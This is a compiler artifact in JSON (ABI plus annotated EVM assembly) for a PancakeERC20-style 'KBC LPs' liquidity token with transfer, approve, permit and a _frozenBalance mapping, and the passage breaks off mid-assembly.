{
	"src/exchange-protocol/contracts/PancakeERC20.sol": {
		"PancakeERC20": {
			"abi": [
				{
					"inputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "owner",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "Approval",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "from",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "Transfer",
					"type": "event"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "DOMAIN_SEPARATOR",
					"outputs": [
						{
							"internalType": "bytes32",
							"name": "",
							"type": "bytes32"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "PERMIT_TYPEHASH",
					"outputs": [
						{
							"internalType": "bytes32",
							"name": "",
							"type": "bytes32"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"name": "_frozenBalance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"name": "allowance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "approve",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"name": "balanceOf",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "decimals",
					"outputs": [
						{
							"internalType": "uint8",
							"name": "",
							"type": "uint8"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "name",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"name": "nonces",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "owner",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						},
						{
							"internalType": "uint256",
							"name": "deadline",
							"type": "uint256"
						},
						{
							"internalType": "uint8",
							"name": "v",
							"type": "uint8"
						},
						{
							"internalType": "bytes32",
							"name": "r",
							"type": "bytes32"
						},
						{
							"internalType": "bytes32",
							"name": "s",
							"type": "bytes32"
						}
					],
					"name": "permit",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "symbol",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "totalSupply",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "transfer",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "from",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "transferFrom",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":139:4483  contract PancakeERC20 is IPancakeERC20 {... */\n  mstore(0x40, 0x80)\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1059:1544  constructor() public {... */\n  callvalue\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x00\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n  pop\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1245:1378  keccak256(... */\n  mload(0x40)\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1149:1156  chainid */\n  chainid\n  swap1\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1245:1378  keccak256(... */\n  dup1\n  0x52\n  data_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f\n  dup3\n  codecopy\n  0x40\n  dup1\n  mload\n  swap2\n  dup3\n  swap1\n  sub\n  0x52\n  add\n  dup3\n  keccak256\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1412:1416  name */\n  dup3\n  dup3\n  add\n  dup3\n  mstore\n  0x07\n  dup4\n  mstore\n  shl(0xc8, 0x4b4243204c5073)\n  0x20\n  swap4\n  dup5\n  add\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1446:1456  bytes(\"1\") */\n  dup2\n  mload\n  dup1\n  dup4\n  add\n  dup4\n  mstore\n  0x01\n  dup2\n  mstore\n  shl(0xf8, 0x31)\n  swap1\n  dup5\n  add\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1217:1527  abi.encode(... */\n  dup2\n  mload\n  dup1\n  dup5\n  add\n  swap2\n  swap1\n  swap2\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1396:1418  keccak256(bytes(name)) */\n  0x6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1217:1527  abi.encode(... */\n  dup2\n  dup4\n  add\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1436:1457  keccak256(bytes(\"1\")) */\n  0xc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1217:1527  abi.encode(... */\n  0x60\n  dup3\n  add\n  mstore\n  0x80\n  dup2\n  add\n  swap5\n  swap1\n  swap5\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1508:1512  this */\n  address\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1217:1527  abi.encode(... */\n  0xa0\n  dup1\n  dup7\n  add\n  swap2\n  swap1\n  swap2\n  mstore\n  dup2\n  mload\n    /* \"--CODEGEN--\":26:47   */\n  dup1\n  dup7\n  sub\n    /* \"--CODEGEN--\":22:54   */\n  swap1\n  swap2\n  add\n    /* \"--CODEGEN--\":6:55   */\n  dup2\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1217:1527  abi.encode(... */\n  0xc0\n  swap1\n  swap5\n  add\n  swap1\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1194:1537  keccak256(... */\n  dup3\n  mload\n  swap3\n  add\n  swap2\n  swap1\n  swap2\n  keccak256\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1175:1191  DOMAIN_SEPARATOR */\n  0x04\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1175:1537  DOMAIN_SEPARATOR = keccak256(... */\n  sstore\n  pop\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":139:4483  contract PancakeERC20 is IPancakeERC20 {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\ndata_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f 454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429\n\nsub_0: assembly {\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":139:4483  contract PancakeERC20 is IPancakeERC20 {... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_1:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":139:4483  contract PancakeERC20 is IPancakeERC20 {... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x47d5d856\n      gt\n      tag_17\n      jumpi\n      dup1\n      0x95d89b41\n      gt\n      tag_18\n      jumpi\n      dup1\n      0x95d89b41\n      eq\n      tag_13\n      jumpi\n      dup1\n      0xa9059cbb\n      eq\n      tag_14\n      jumpi\n      dup1\n      0xd505accf\n      eq\n      tag_15\n      jumpi\n      dup1\n      0xdd62ed3e\n      eq\n      tag_16\n      jumpi\n      jump(tag_2)\n    tag_18:\n      dup1\n      0x47d5d856\n      eq\n      tag_10\n      jumpi\n      dup1\n      0x70a08231\n      eq\n      tag_11\n      jumpi\n      dup1\n      0x7ecebe00\n      eq\n      tag_12\n      jumpi\n      jump(tag_2)\n    tag_17:\n      dup1\n      0x23b872dd\n      gt\n      tag_19\n      jumpi\n      dup1\n      0x23b872dd\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x30adf81f\n      eq\n      tag_7\n      jumpi\n      dup1\n      0x313ce567\n      eq\n      tag_8\n      jumpi\n      dup1\n      0x3644e515\n      eq\n      tag_9\n      jumpi\n      jump(tag_2)\n    tag_19:\n      dup1\n      0x06fdde03\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x095ea7b3\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x18160ddd\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":217:256  string public constant name = \"KBC LPs\" */\n    tag_3:\n      tag_20\n      tag_21\n      jump\t// in\n    tag_20:\n      0x40\n      dup1\n      mload\n      0x20\n      dup1\n      dup3\n      mstore\n      dup4\n      mload\n      dup2\n      dup4\n      add\n      mstore\n      dup4\n      mload\n      swap2\n      swap3\n      dup4\n      swap3\n      swap1\n      dup4\n      add\n      swap2\n      dup6\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_22:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_24\n      jumpi\n        /* \"--CODEGEN--\":90:101   */\n      dup2\n      dup2\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":71:82   */\n      dup4\n      dup3\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_22)\n    tag_24:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":217:256  string public constant name = \"KBC LPs\" */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_25\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_25:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2852:2999  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_4:\n      tag_26\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_27\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_27:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2852:2999  function approve(address spender, uint256 value) external returns (bool) {... */\n      dup2\n      calldataload\n      and\n      swap1\n      0x20\n      add\n      calldataload\n      tag_28\n      jump\t// in\n    tag_26:\n      0x40\n      dup1\n      mload\n      swap2\n      iszero\n      iszero\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":349:375  uint256 public totalSupply */\n    tag_5:\n      tag_29\n      tag_30\n      jump\t// in\n    tag_29:\n      0x40\n      dup1\n      mload\n      swap2\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3150:3511  function transferFrom(... */\n    tag_6:\n      tag_26\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x60\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_32\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_32:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3150:3511  function transferFrom(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      add\n      calldataload\n      tag_33\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":698:814  bytes32 public constant PERMIT_TYPEHASH =... */\n    tag_7:\n      tag_29\n      tag_35\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":308:343  uint8 public constant decimals = 18 */\n    tag_8:\n      tag_36\n      tag_37\n      jump\t// in\n    tag_36:\n      0x40\n      dup1\n      mload\n      0xff\n      swap1\n      swap3\n      and\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":557:588  bytes32 public DOMAIN_SEPARATOR */\n    tag_9:\n      tag_29\n      tag_39\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":501:550  mapping(address => uint256) public _frozenBalance */\n    tag_10:\n      tag_29\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_41\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_41:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":501:550  mapping(address => uint256) public _frozenBalance */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_42\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":381:425  mapping(address => uint256) public balanceOf */\n    tag_11:\n      tag_29\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_44\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_44:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":381:425  mapping(address => uint256) public balanceOf */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_45\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":820:861  mapping(address => uint256) public nonces */\n    tag_12:\n      tag_29\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_47\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_47:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":820:861  mapping(address => uint256) public nonces */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_48\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":262:302  string public constant symbol = \"KBC-LP\" */\n    tag_13:\n      tag_20\n      tag_50\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3005:3144  function transfer(address to, uint256 value) external returns (bool) {... */\n    tag_14:\n      tag_26\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_56\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_56:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3005:3144  function transfer(address to, uint256 value) external returns (bool) {... */\n      dup2\n      calldataload\n      and\n      swap1\n      0x20\n      add\n      calldataload\n      tag_57\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3517:4481  function permit(... */\n    tag_15:\n      tag_58\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:16   */\n      0xe0\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:17   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_59\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_59:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3517:4481  function permit(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      dup2\n      add\n      calldataload\n      swap1\n      0x60\n      dup2\n      add\n      calldataload\n      swap1\n      0xff\n      0x80\n      dup3\n      add\n      calldataload\n      and\n      swap1\n      0xa0\n      dup2\n      add\n      calldataload\n      swap1\n      0xc0\n      add\n      calldataload\n      tag_60\n      jump\t// in\n    tag_58:\n      stop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":431:495  mapping(address => mapping(address => uint256)) public allowance */\n    tag_16:\n      tag_29\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_62\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_62:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":431:495  mapping(address => mapping(address => uint256)) public allowance */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      add\n      calldataload\n      and\n      tag_63\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":217:256  string public constant name = \"KBC LPs\" */\n    tag_21:\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x07\n      dup2\n      mstore\n      0x20\n      add\n      shl(0xc8, 0x4b4243204c5073)\n      dup2\n      mstore\n      pop\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2852:2999  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_28:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2919:2923  bool */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2935:2971  _approve(msg.sender, spender, value) */\n      tag_65\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2944:2954  msg.sender */\n      caller\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2956:2963  spender */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2965:2970  value */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2935:2943  _approve */\n      tag_66\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2935:2971  _approve(msg.sender, spender, value) */\n      jump\t// in\n    tag_65:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2988:2992  true */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2852:2999  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_64:\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":349:375  uint256 public totalSupply */\n    tag_30:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3150:3511  function transferFrom(... */\n    tag_33:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3281:3296  allowance[from] */\n      dup4\n      and\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3261:3265  bool */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3281:3296  allowance[from] */\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3281:3290  allowance */\n      0x02\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3281:3296  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3297:3307  msg.sender */\n      caller\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3281:3308  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      dup2\n      keccak256\n      sload\n      not(0x00)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3281:3323  allowance[from][msg.sender] != uint256(-1) */\n      eq\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3277:3448  if (allowance[from][msg.sender] != uint256(-1)) {... */\n      tag_68\n      jumpi\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3384  allowance[from] */\n      dup5\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3378  allowance */\n      0x02\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3384  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3385:3395  msg.sender */\n      caller\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3396  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      swap1\n      keccak256\n      sload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3437  allowance[from][msg.sender].sub(... */\n      tag_69\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3418:3423  value */\n      dup4\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3437  allowance[from][msg.sender].sub(... */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3400  allowance[from][msg.sender].sub */\n      tag_70\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3437  allowance[from][msg.sender].sub(... */\n      and\n      jump\t// in\n    tag_69:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3339:3354  allowance[from] */\n      dup6\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3339:3348  allowance */\n      0x02\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3339:3354  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3355:3365  msg.sender */\n      caller\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3339:3366  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      swap1\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3339:3437  allowance[from][msg.sender] = allowance[from][msg.sender].sub(... */\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3277:3448  if (allowance[from][msg.sender] != uint256(-1)) {... */\n    tag_68:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3457:3483  _transfer(from, to, value) */\n      tag_71\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3467:3471  from */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3473:3475  to */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3477:3482  value */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3457:3466  _transfer */\n      tag_72\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3457:3483  _transfer(from, to, value) */\n      jump\t// in\n    tag_71:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3500:3504  true */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3150:3511  function transferFrom(... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":698:814  bytes32 public constant PERMIT_TYPEHASH =... */\n    tag_35:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":748:814  0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9 */\n      